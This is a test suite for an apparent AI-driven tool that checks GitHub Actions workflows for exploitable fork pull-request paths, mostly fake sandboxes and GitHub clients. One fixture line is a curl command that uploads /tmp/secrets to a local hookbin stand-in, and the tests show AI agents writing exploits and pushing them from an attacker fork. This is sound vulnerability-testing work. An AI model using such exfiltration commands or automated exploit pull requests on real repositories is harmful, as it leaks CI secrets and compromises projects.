from __future__ import annotations

import io
import json
from pathlib import Path
import subprocess
import time
import zipfile

import pytest
from pwn_hunter_ai.attack import execution_service as execution_service_module

from pwn_hunter_ai.attack.agent_runtime import AttackAgentProvider
from pwn_hunter_ai.attack.execution_service import AttackExecutionService
from pwn_hunter_ai.github_client import GitHubApiError


@pytest.fixture(autouse=True)
def isolated_local_secrets_template(tmp_path, monkeypatch):
    template = tmp_path / "synthetic-secrets-template"
    template.write_text("GITHUB_TOKEN={{GITHUB_TOKEN}}\nFERN_TOKEN=synthetic-existing-fern\n")
    monkeypatch.setattr(execution_service_module, "LOCAL_SECRETS_TEMPLATE_PATH", template)
    return template


class _FakeSandbox:
    def __init__(self) -> None:
        self.git_calls: list[list[str]] = []
        self._staged_stdout = "main.py\n"

    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        self.git_calls.append(args)
        if args[:3] == ["diff", "--name-only", "HEAD~1"]:
            return subprocess.CompletedProcess(args, 0, stdout="main.py\n", stderr="")
        if args[:2] == ["show", "HEAD:main.py"]:
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
        if args[:2] == ["show", "HEAD~1:main.py"]:
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
        if args[:3] == ["diff", "--cached", "--name-only"]:
            return subprocess.CompletedProcess(
                args, 0, stdout=self._staged_stdout, stderr=""
            )
        if args[:2] == ["ls-files", "--deleted"]:
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    def read_file(self, relative_path: str) -> str | None:
        if relative_path == "main.py":
            return (
                "curl -X PUT -d @/tmp/secrets "
                'http://127.0.0.1:8787/${GITHUB_RUN_ID}\n'
            )
        return None


class _FakeOpenHandsSandbox:
    def __init__(self, returncode: int) -> None:
        self.returncode = returncode
        self.calls: list[int] = []

    def run_openhands_headless(self, *, timeout: int) -> subprocess.CompletedProcess:
        self.calls.append(timeout)
        return subprocess.CompletedProcess(
            args=["python", "-c", "print('fake')"],
            returncode=self.returncode,
            stdout="",
            stderr="",
        )


def test_cleanup_docker_resources_after_repository_processing_prunes_for_gemini(
    monkeypatch,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    service._agent_provider = AttackAgentProvider.GEMINI_CLI  # noqa: SLF001
    commands: list[list[str]] = []

    def fake_run(cmd, **kwargs):
        _ = kwargs
        commands.append(list(cmd))
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr("subprocess.run", fake_run)

    service._cleanup_docker_resources_after_repository_processing(  # noqa: SLF001
        repository_name="owner/repo"
    )

    assert commands == [
        ["docker", "container", "prune", "--force"],
        ["docker", "volume", "prune", "--force"],
    ]


def test_cleanup_docker_resources_after_repository_processing_skips_for_non_gemini(
    monkeypatch,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    service._agent_provider = AttackAgentProvider.OPENHANDS  # noqa: SLF001
    calls: list[list[str]] = []

    def fake_run(cmd, **kwargs):
        _ = kwargs
        calls.append(list(cmd))
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr("subprocess.run", fake_run)

    service._cleanup_docker_resources_after_repository_processing(  # noqa: SLF001
        repository_name="owner/repo"
    )

    assert calls == []


def test_run_openhands_with_fallback_uses_sandbox_by_default(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.delenv("PWNHUNTER_USE_HOST_OPENHANDS_DIRECTLY", raising=False)
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeOpenHandsSandbox(returncode=1)
    host_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        service,
        "_run_openhands_headless_on_host",
        lambda **kwargs: host_calls.append(kwargs) or True,
    )

    result = service._run_openhands_with_fallback(  # noqa: SLF001
        sandbox=sandbox,
        workspace_path=tmp_path,
        timeout=123,
        git_token="token",
    )

    assert result == {"ok": False, "exit_code": 1}
    assert sandbox.calls == [123]
    assert host_calls == []


def test_run_openhands_with_fallback_can_run_directly_on_host(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setenv("PWNHUNTER_USE_HOST_OPENHANDS_DIRECTLY", "true")
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeOpenHandsSandbox(returncode=1)
    host_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        service,
        "_run_openhands_headless_on_host",
        lambda **kwargs: host_calls.append(kwargs) or True,
    )

    result = service._run_openhands_with_fallback(  # noqa: SLF001
        sandbox=sandbox,
        workspace_path=tmp_path,
        timeout=123,
        git_token="token",
    )

    assert result == {"ok": True, "exit_code": 0}
    assert sandbox.calls == []
    assert len(host_calls) == 1


def test_commit_and_push_uses_staged_diff_to_detect_empty_commit(
    monkeypatch,
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    git_calls: list[list[str]] = []

    def fake_run(cmd, **kwargs):
        _ = kwargs
        git_calls.append(list(cmd))
        if cmd[:4] == ["git", "diff", "--cached", "--name-only"]:
            return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="", stderr="")
        return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="", stderr="")

    monkeypatch.setattr("subprocess.run", fake_run)

    result = service._commit_and_push(  # noqa: SLF001
        workspace_path=workspace,
        client=object(),  # type: ignore[arg-type]
        repo_name="owner/repo",
        branch="feature/test",
    )

    assert result == {"committed": False, "message": "No changes"}
    assert any(call[:4] == ["git", "diff", "--cached", "--name-only"] for call in git_calls)
    assert all(call[:3] != ["git", "status", "--porcelain"] for call in git_calls)


def test_retry_with_logs_commits_and_pushes_in_sandbox(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeSandbox()
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    prompt_path = workspace_path.parent / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")

    retried = service._retry_with_logs(  # noqa: SLF001
        workspace_path=workspace_path,
        sandbox=sandbox,
        client=object(),  # unused in retry flow
        repo_name="owner/repo",
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        previous_logs=[{"attempt": 1, "conclusion": "failure", "logs": "trace"}],
        attempt=1,
    )

    assert retried is True
    assert ["add", "."] in sandbox.git_calls
    assert any(call[:2] == ["reset", "--"] for call in sandbox.git_calls)
    assert ["diff", "--cached", "--name-only"] in sandbox.git_calls
    assert [
        "commit",
        "-m",
        "Update exploit based on attempt 1 feedback",
    ] in sandbox.git_calls
    assert ["push", "origin", "feature/test", "--force"] in sandbox.git_calls


def test_retry_with_logs_runs_openhands_retry_runner(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeSandbox()
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    prompt_path = workspace_path.parent / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")
    (workspace_path / "agent-task.md").write_text(
        "initial workspace prompt\n",
        encoding="utf-8",
    )
    retry_calls: list[dict[str, object]] = []

    retried = service._retry_with_logs(  # noqa: SLF001
        workspace_path=workspace_path,
        sandbox=sandbox,
        client=object(),  # unused in retry flow
        repo_name="owner/repo",
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        previous_logs=[{"attempt": 1, "conclusion": "failure", "logs": "trace"}],
        attempt=1,
        retry_openhands_runner=lambda: retry_calls.append({"called": True})
        or {"ok": True, "exit_code": 0},
    )

    assert retried is True
    assert retry_calls == [{"called": True}]
    assert "Previous workflow logs" in prompt_path.read_text(encoding="utf-8")


class _FakeGitHubClient:
    def __init__(self, token: str) -> None:
        self._token = token

    def get_authenticated_user(self) -> dict[str, str]:
        login = "user-a" if self._token == "token-a" else "user-b"
        return {"login": login}

    def get_repo_metadata(self, repo_name: str) -> dict[str, str]:
        return {
            "name": repo_name,
            "created_at": "2024-01-01T00:00:00Z",
            "default_branch": "main",
            "parent_full_name": (
                "owner/repo" if repo_name == "user-a/repo" else "user-a/repo"
            ),
        }


def test_execute_attack_blocks_if_user_a_target_matches_source_repo(tmp_path: Path) -> None:
    service = AttackExecutionService(
        github_client_factory=lambda token: _FakeGitHubClient(token)
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="owner/repo",
        user_b_fork="user-b/repo",
        workspace_path=tmp_path,
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert "matches source repository" in result["reason"]


class _CommitCaptureSandbox:
    def __init__(self) -> None:
        self.exclude_paths: list[str] | None = None

    def commit_and_push(
        self,
        branch: str,
        commit_message: str = "Add temporary change",
        exclude_paths: list[str] | None = None,
    ) -> bool:
        self.exclude_paths = exclude_paths
        return True


class _GitignoreRepairSandbox(_FakeSandbox):
    def __init__(self) -> None:
        super().__init__()
        self.repair_calls = 0

    def _ensure_attack_gitignore_entries(self) -> None:
        self.repair_calls += 1


def test_commit_and_push_in_sandbox_uses_default_commit_scope() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _CommitCaptureSandbox()

    result = service._commit_and_push_in_sandbox(  # noqa: SLF001
        sandbox=sandbox,
        branch="feature/test",
    )

    assert result == {"committed": True}
    assert sandbox.exclude_paths == [
        "agent-task.md",
        "agent-output.json",
        "LEARNINGS.md",
        "GEMINI.md",
        ".pwnhunter-workflow-logs",
        ".gitignore",
        ".github/workflows",
        ".secrets",
        ".runner.env",
        "event.json",
        ".actrc",
        "test-exploit-locally.py",
    ]


def test_commit_and_push_in_sandbox_reapplies_gitignore_entries_before_staging() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _GitignoreRepairSandbox()

    result = service._commit_and_push_in_sandbox(  # noqa: SLF001
        sandbox=sandbox,
        branch="feature/test",
    )

    assert result["committed"] is True
    assert sandbox.repair_calls == 1


class _RetrySandboxWithChanges(_FakeSandbox):
    def __init__(self) -> None:
        super().__init__()
        self._added_any = False

    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        self.git_calls.append(args)
        if args[:2] == ["status", "--porcelain"]:
            return subprocess.CompletedProcess(args, 0, stdout=" M main.py\n", stderr="")
        if args[:2] == ["add", "."]:
            self._added_any = True
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
        if args[:3] == ["diff", "--cached", "--name-only"]:
            staged = "main.py\n" if self._added_any else ""
            return subprocess.CompletedProcess(args, 0, stdout=staged, stderr="")
        if args[:2] == ["ls-files", "--deleted"]:
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
        if args[:2] == ["--no-pager", "show"]:
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")


class _DiffPrintingSandbox(_FakeSandbox):
    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        if args[:2] == ["--no-pager", "show"]:
            return subprocess.CompletedProcess(
                args,
                0,
                stdout="commit abc123\n\n main.py | 2 ++\n 1 file changed, 2 insertions(+)\n",
                stderr="",
            )
        return super().run_git(args, check=check)


def test_retry_with_logs_commits_when_workspace_has_changes(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _RetrySandboxWithChanges()
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    prompt_path = workspace_path.parent / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")

    retried = service._retry_with_logs(  # noqa: SLF001
        workspace_path=workspace_path,
        sandbox=sandbox,
        client=object(),
        repo_name="owner/repo",
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        previous_logs=[{"attempt": 1, "conclusion": "failure", "logs": "trace"}],
        attempt=1,
    )

    assert retried is True
    assert ["add", "."] in sandbox.git_calls
    assert any(call[:2] == ["reset", "--"] for call in sandbox.git_calls)


def test_commit_and_push_in_sandbox_prints_new_commit_diff(caplog) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _DiffPrintingSandbox()

    with caplog.at_level("INFO"):
        result = service._commit_and_push_in_sandbox(  # noqa: SLF001
            sandbox=sandbox,
            branch="feature/test",
        )

    assert result["committed"] is True
    assert "[PWNHUNTER] New commit diff pushed on feature/test:" in caplog.text
    assert "commit abc123" in caplog.text


class _ExecuteSandbox:
    def __init__(self, *, controller_signal: dict[str, object] | None = None) -> None:
        self.controller_signal = controller_signal
        self.committed = False
        self.stopped = False
        self.removed = False
        self.cloned = False
        self.checked_out = False

    def clone_repository(self, clone_url: str) -> None:
        self.cloned = True

    def checkout_branch(self, branch_name: str) -> None:
        self.checked_out = True

    def commit_and_push(
        self,
        branch: str,
        commit_message: str = "Add temporary change",
        exclude_paths: list[str] | None = None,
    ) -> bool:
        self.committed = True
        return True

    def read_file(self, relative_path: str) -> str | None:
        if (
            relative_path == "agent-output.json"
            and self.controller_signal is not None
        ):
            return json.dumps(self.controller_signal)
        return None

    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        if args[:3] == ["diff", "--cached", "--name-only"]:
            return subprocess.CompletedProcess(
                args,
                0,
                stdout="docker-compose-ci.yml\n",
                stderr="",
            )
        if args[:1] == ["commit"]:
            self.committed = True
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    def stop(self) -> None:
        self.stopped = True

    def remove(self) -> None:
        self.removed = True


class _ExecuteSandboxWithGitCallCapture(_ExecuteSandbox):
    def __init__(self) -> None:
        super().__init__()
        self.git_calls: list[list[str]] = []

    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        _ = check
        self.git_calls.append(args)
        return super().run_git(args, check=check)


class _ExecuteSandboxWithOpenHands(_ExecuteSandbox):
    def __init__(self, *, controller_signals: list[dict[str, object]]) -> None:
        super().__init__()
        self._controller_signals = list(controller_signals)
        self._openhands_calls = 0

    def run_openhands_headless(self, *, timeout: int) -> subprocess.CompletedProcess:
        _ = timeout
        self._openhands_calls += 1
        return subprocess.CompletedProcess(args=["openhands"], returncode=0)

    def read_file(self, relative_path: str) -> str | None:
        if (
            relative_path == "agent-output.json"
            and self._controller_signals
            and self._openhands_calls > 0
        ):
            index = min(self._openhands_calls - 1, len(self._controller_signals) - 1)
            return json.dumps(self._controller_signals[index])
        return None


class _NoStagedChangesExecuteSandbox(_ExecuteSandbox):
    def __init__(
        self,
        *,
        changed_status: str,
        controller_signal: dict[str, object] | None = None,
    ) -> None:
        super().__init__(controller_signal=controller_signal)
        self._changed_status = changed_status

    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        if args[:3] == ["diff", "--cached", "--name-only"]:
            return subprocess.CompletedProcess(
                args,
                0,
                stdout="",
                stderr="",
            )
        if args[:2] == ["status", "--porcelain"]:
            return subprocess.CompletedProcess(
                args,
                0,
                stdout=self._changed_status,
                stderr="",
            )
        if args[:1] == ["commit"]:
            self.committed = True
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")


class _ExecuteSandboxManager:
    def __init__(self, sandbox: _ExecuteSandbox) -> None:
        self.sandbox = sandbox
        self.create_calls = 0

    def create_sandbox(
        self,
        repository_name: str,
        workspace_path: Path,
        git_token: str | None = None,
    ) -> _ExecuteSandbox:
        self.create_calls += 1
        return self.sandbox


class _ExecuteHookbinClient:
    base_url = "http://127.0.0.1:8787"

    def get_logs_as_text(self, bin_id: str) -> str:
        return ""


class _ExecuteGitHubClient:
    def __init__(self, token: str) -> None:
        self.token = token
        self.created_pr_payload: dict[str, str] | None = None
        self.created_branches: list[tuple[str, str, str]] = []
        self.fetched_workflows: list[tuple[str, str, str]] = []
        self.closed_pr_numbers: list[int] = []
        self.updated_pr_payloads: list[dict[str, object]] = []
        self.requested_reviewers: list[list[str]] = []
        self.removed_reviewers: list[list[str]] = []
        self.added_assignees: list[list[str]] = []
        self.removed_assignees: list[list[str]] = []
        self.ready_for_review_calls: list[int] = []
        self.converted_to_draft_calls: list[int] = []
        self.created_reviews: list[dict[str, str]] = []
        self.set_actions_secret_calls: list[tuple[str, str, str]] = []

    def get_authenticated_user(self) -> dict[str, str]:
        return {"login": "user-a" if self.token == "token-a" else "user-b"}

    def get_repo_metadata(self, repo_name: str) -> dict[str, str]:
        parent_full_name = ""
        if repo_name == "playground/repo":
            parent_full_name = "owner/repo"
        elif repo_name == "attacker/repo":
            parent_full_name = "playground/repo"
        return {
            "name": repo_name,
            "created_at": "2024-01-01T00:00:00Z",
            "default_branch": "main",
            "parent_full_name": parent_full_name,
        }

    def create_pull_request(
        self,
        repo_name: str,
        title: str,
        body: str,
        head: str,
        base: str,
    ) -> dict[str, object]:
        self.created_pr_payload = {
            "repo_name": repo_name,
            "title": title,
            "body": body,
            "head": head,
            "base": base,
        }
        return {
            "number": 42,
            "html_url": "https://github.com/playground/repo/pull/42",
            "base": {"repo": {"full_name": repo_name}},
        }

    def list_pull_requests(
        self,
        repo_name: str,
        state: str = "open",
        head: str | None = None,
        base: str | None = None,
    ) -> list[dict[str, object]]:
        _ = (repo_name, state, head, base)
        return []

    def close_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = repo_name
        self.closed_pr_numbers.append(pull_number)
        return {"number": pull_number, "state": "closed"}

    def update_pull_request(
        self,
        repo_name: str,
        pull_number: int,
        *,
        title: str | None = None,
        body: str | None = None,
        state: str | None = None,
    ) -> dict[str, object]:
        self.updated_pr_payloads.append(
            {
                "repo_name": repo_name,
                "pull_number": pull_number,
                "title": title,
                "body": body,
                "state": state,
            }
        )
        return {"number": pull_number, "state": state or "open"}

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = repo_name
        return {
            "number": pull_number,
            "title": "Add temporary change",
            "body": "Temporary change body",
            "node_id": "PR_kwDOExample",
            "head": {"sha": "abc123"},
        }

    def request_pull_request_reviewers(
        self,
        repo_name: str,
        pull_number: int,
        *,
        reviewers: list[str] | None = None,
        team_reviewers: list[str] | None = None,
    ) -> dict[str, object]:
        _ = (repo_name, pull_number, team_reviewers)
        self.requested_reviewers.append(list(reviewers or []))
        return {"ok": True}

    def remove_pull_request_reviewers(
        self,
        repo_name: str,
        pull_number: int,
        *,
        reviewers: list[str] | None = None,
        team_reviewers: list[str] | None = None,
    ) -> dict[str, object]:
        _ = (repo_name, pull_number, team_reviewers)
        self.removed_reviewers.append(list(reviewers or []))
        return {"ok": True}

    def create_pull_request_review(
        self,
        repo_name: str,
        pull_number: int,
        *,
        event: str,
        body: str = "",
    ) -> dict[str, object]:
        _ = (repo_name, pull_number)
        self.created_reviews.append({"event": event, "body": body})
        return {"ok": True}

    def add_issue_assignees(
        self,
        repo_name: str,
        issue_number: int,
        assignees: list[str],
    ) -> dict[str, object]:
        _ = (repo_name, issue_number)
        self.added_assignees.append(list(assignees))
        return {"ok": True}

    def remove_issue_assignees(
        self,
        repo_name: str,
        issue_number: int,
        assignees: list[str],
    ) -> dict[str, object]:
        _ = (repo_name, issue_number)
        self.removed_assignees.append(list(assignees))
        return {"ok": True}

    def ready_pull_request_for_review(
        self,
        repo_name: str,
        pull_number: int,
    ) -> dict[str, object]:
        _ = repo_name
        self.ready_for_review_calls.append(pull_number)
        return {"number": pull_number}

    def convert_pull_request_to_draft(
        self,
        repo_name: str,
        pull_number: int,
    ) -> dict[str, object]:
        _ = repo_name
        self.converted_to_draft_calls.append(pull_number)
        return {"number": pull_number}

    def get_branch_head_sha(self, repo_name: str, branch: str) -> str:
        _ = (repo_name, branch)
        return "abc123"

    def create_branch(
        self,
        repo_name: str,
        branch_name: str,
        sha: str,
    ) -> dict[str, object]:
        self.created_branches.append((repo_name, branch_name, sha))
        return {"ref": f"refs/heads/{branch_name}", "object": {"sha": sha}}

    def get_file_content(self, repo_name: str, path: str, ref: str) -> str:
        self.fetched_workflows.append((repo_name, path, ref))
        raise GitHubApiError(
            f"GitHub API request failed for /repos/{repo_name}/contents/{path}?ref={ref}: 404 Not Found"
        )

    def set_actions_secret(self, repo_name: str, name: str, value: str) -> None:
        self.set_actions_secret_calls.append((repo_name, name, value))


def test_execute_attack_respects_not_vulnerable_controller_signal(tmp_path: Path) -> None:
    sandbox = _ExecuteSandbox(
        controller_signal={
            "vulnerable": "no",
            "human_review_needed": False,
            "reason": "workflow requires trusted maintainer label before execution",
            "notes": "",
        }
    )
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["reason"] == (
        "workflow requires trusted maintainer label before execution"
    )
    assert result["controller_signal"]["status"] == "not_vulnerable"
    assert sandbox.committed is False
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_resets_workspace_to_origin_default_branch_before_parsing(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandboxWithGitCallCapture()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    branches: [main]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is False
    assert ["fetch", "origin", "main"] in sandbox.git_calls
    assert ["checkout", "main"] in sandbox.git_calls
    assert ["reset", "--hard", "origin/main"] in sandbox.git_calls
    assert ["clean", "-fd"] in sandbox.git_calls


def test_execute_attack_retries_initial_gemini_timeout_and_continues(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        agent_provider="gemini-cli",
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    call_count = 0

    def fake_run_agent_with_fallback(**kwargs):
        nonlocal call_count
        call_count += 1
        workspace_path = kwargs["workspace_path"]
        metadata_path = workspace_path.parent / "agent-runtime.autoexecute.json"
        status = "timeout" if call_count == 1 else "completed"
        metadata_path.write_text(json.dumps({"status": status}), encoding="utf-8")
        if status == "timeout":
            return {"ok": False, "exit_code": 1}
        return {"ok": True, "exit_code": 0}

    monkeypatch.setattr(service, "_run_agent_with_fallback", fake_run_agent_with_fallback)

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
        max_retries=3,
    )

    assert call_count == 2
    assert result["vulnerable"] is False
    assert user_b_client.created_pr_payload is not None
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_reports_timeout_after_initial_gemini_retries_exhausted(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        agent_provider="gemini-cli",
    )

    call_count = 0

    def fake_run_agent_with_fallback(**kwargs):
        nonlocal call_count
        call_count += 1
        workspace_path = kwargs["workspace_path"]
        metadata_path = workspace_path.parent / "agent-runtime.autoexecute.json"
        metadata_path.write_text(json.dumps({"status": "timeout"}), encoding="utf-8")
        return {"ok": False, "exit_code": 1}

    monkeypatch.setattr(service, "_run_agent_with_fallback", fake_run_agent_with_fallback)

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
        max_retries=2,
    )

    assert call_count == 2
    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["reason"] == "Agent execution timed out after retries."
    assert user_b_client.created_pr_payload is None
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_skips_when_gemini_node_runtime_unavailable(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        agent_provider="gemini-cli",
    )

    def fake_run_agent_with_fallback(**kwargs):
        _ = kwargs
        return {
            "ok": False,
            "exit_code": None,
            "status": "skipped_node_runtime_unavailable",
            "reason": "Gemini CLI skipped: unable to activate Node.js 24, 22, or 20 via nvm.",
        }

    monkeypatch.setattr(service, "_run_agent_with_fallback", fake_run_agent_with_fallback)

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
        max_retries=2,
    )

    assert result["vulnerable"] is False
    assert result["status"] == "skipped_node_runtime_unavailable"
    assert "node.js 24, 22, or 20" in str(result["reason"]).lower()
    assert user_b_client.created_pr_payload is None
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_collects_learning_only_on_success(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        agent_provider="gemini-cli",
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": True}  # type: ignore[method-assign]
    service._run_agent_with_fallback = lambda **kwargs: {"ok": True, "exit_code": 0}  # type: ignore[method-assign]
    patch_calls: list[dict[str, object]] = []
    service._build_exploit_patch_for_pull_request = (  # type: ignore[method-assign]
        lambda **kwargs: patch_calls.append(kwargs)
        or {
            "format": "git-format-patch",
            "commit_range": "origin/main..feature/temp-change-1",
            "patch": "From abcdef Mon Sep 17 00:00:00 2001\n",
        }
    )

    learning_calls: list[dict[str, object]] = []
    service._collect_and_persist_learning_after_success = (  # type: ignore[method-assign]
        lambda **kwargs: learning_calls.append(kwargs)
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is True
    assert result["exploit_patch"]["format"] == "git-format-patch"
    assert "From abcdef" in result["exploit_patch"]["patch"]
    assert len(patch_calls) == 1
    assert len(learning_calls) == 1
    assert learning_calls[0]["workspace_path"] == tmp_path / "workspace"


def test_execute_attack_does_not_collect_learning_on_failure(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        agent_provider="gemini-cli",
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    service._run_agent_with_fallback = lambda **kwargs: {"ok": True, "exit_code": 0}  # type: ignore[method-assign]

    learning_calls: list[dict[str, object]] = []
    service._collect_and_persist_learning_after_success = (  # type: ignore[method-assign]
        lambda **kwargs: learning_calls.append(kwargs)
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert learning_calls == []


def test_execute_attack_generates_and_persists_security_report_for_hosted_verification(
    tmp_path: Path,
) -> None:
    workspace_path = tmp_path / "workspace"
    reports_dir = tmp_path / "security-reports"
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        security_reports_dir=reports_dir,
        generate_security_report=True,
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": True}  # type: ignore[method-assign]
    run_calls: list[dict[str, object]] = []

    def fake_run_agent_with_fallback(**kwargs):
        run_calls.append(kwargs)
